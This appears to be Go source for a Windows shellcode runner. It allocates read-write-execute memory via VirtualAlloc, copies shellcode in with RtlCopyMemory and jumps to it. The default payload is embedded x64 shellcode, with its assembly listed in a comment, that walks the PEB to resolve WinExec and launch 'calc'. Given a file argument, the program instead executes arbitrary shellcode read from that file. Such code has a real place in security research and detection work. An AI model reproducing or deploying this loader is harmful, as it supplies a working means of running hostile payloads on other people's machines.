package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_calc = []byte{ /*
			bits 64
			section .text
			global shellcode
			shellcode:

			    ; x64 WinExec *requires* 16 byte stack alignment and four QWORDS of stack space, which may be overwritten.
			    ; http://msdn.microsoft.com/en-us/library/ms235286.aspx

			    push rax
			    push rcx
			    push rdx
			    push rbx
			    push rsi
			    push rdi
			    push rbp
			    push 0x60                                       ; Stack is now 16 bit aligned
			    pop rdx                                         ; RDX = 0x60
			    push 'calc'
			    push rsp
			    pop rcx                                         ; RCX = &("calc")
			    sub rsp, 0x28                                    ; Stack was 16 byte aligned already and there are >4 QWORDS on the stack.
			    mov rsi, [gs:rdx]                               ; RSI = [TEB + 0x60] = &PEB
			    mov rsi, [rsi + 0x18]                           ; RSI = [PEB + 0x18] = PEB_LDR_DATA
			    mov rsi, [rsi + 0x10]                           ; RSI = [PEB_LDR_DATA + 0x10] = LDR_MODULE InLoadOrder[0] (process)
			    lodsq                                           ; RAX = InLoadOrder[1] (ntdll)
			    mov rsi, [rax]                                  ; RSI = InLoadOrder[2] (kernel32)
			    mov rdi, [rsi + 0x30]                           ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase

			    ; Found kernel32 base address (RDI)

			    add edx, dword [rdi + 0x3c]                     ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60

			    ; PE header (RDI+RDX-0x60) = @0x00 0x04 byte signature
			    ;                            @0x04 0x18 byte COFF header
			    ;                            @0x18      PE32 optional header (= RDI + RDX - 0x60 + 0x18)

			    mov ebx, dword [rdi + rdx - 0x60 + 0x18 + 0x70] ; RBX = [PE32+ optional header + offset(PE32+ export table offset)] = offset(export table)

			    ; Export table (RDI+EBX) = @0x20 Name Pointer RVA

			    mov esi, dword [rdi + rbx + 0x20]               ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
			    add rsi, rdi                                    ; RSI = kernel32 + offset(names table) = &(names table)

			    ; Found export names table (RSI)

			    mov edx, dword [rdi + rbx + 0x24]               ; EDX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)

			    ; Found export ordinals table (RDX)

			find_winexec_x64:                                   ; speculatively load ordinal (RBP)
			    movzx ebp, word [rdi + rdx]                     ; RBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
			    lea edx, [rdx + 2]                              ; RDX = offset += 2 (will wrap if > 4Gb, but this should never happen)
			    lodsd                                           ; RAX = &(names table[function number]) = offset(function name)
			    cmp dword [rdi + rax], 'WinE'                   ; *(DWORD*)(function name) == "WinE" ?
			    jne find_winexec_x64

			    mov esi, dword [rdi + rbx + 0x1c]               ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)
			    add rsi, rdi                                    ; RSI = kernel32 + offset(address table) = &(address table)
			    mov esi, [rsi + rbp * 4]                        ; RSI = &(address table)[WinExec ordinal] = offset(WinExec)
			    add rdi, rsi                                    ; RDI = kernel32 + offset(WinExec) = WinExec

			; Found WinExec (RDI)

			    cdq                                             ; RDX = 0 (assuming EAX < 0x80000000, which should always be true)
			    call rdi                                        ; WinExec(&("calc"), 0);
			    add rsp, 0x30                                   ; reset stack to where it was after pushing registers
			    pop rbp                                         ; pop all the items off the stack that we pushed on earlier
			    pop rdi
			    pop rsi
			    pop rbx
			    pop rdx
			    pop rcx
			    pop rax
			    retn
		*/

		// nasm -DFUNC=TRUE -DCLEAN=TRUE -DSTACK_ALIGN=TRUE w64-exec-calc-shellcode.asm

		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
		0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
	}
)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	shellcode := shellcode_calc
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
